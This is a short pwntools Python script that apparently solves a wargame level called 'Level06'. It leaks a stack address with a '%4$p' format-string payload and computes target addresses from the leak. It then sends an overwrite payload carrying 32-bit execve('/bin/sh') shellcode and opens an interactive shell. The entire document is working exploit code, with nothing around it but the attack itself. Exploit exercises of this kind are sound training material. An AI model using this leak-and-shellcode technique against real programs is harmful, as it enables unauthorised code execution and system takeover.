from pwn import*

p = process('./Level06')

payload = b"%4$p"
p.sendline(payload)
p.recvuntil(b"0x")
stack_leak = int(p.recv(8),16)

shellcode = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

s = stack_leak - 52 
shellcode_addr = s + 16
payload = b"a"*4 + p32(shellcode_addr) + p32(s+8) + b"a"*4 + shellcode

p.sendline(payload)
p.interactive()
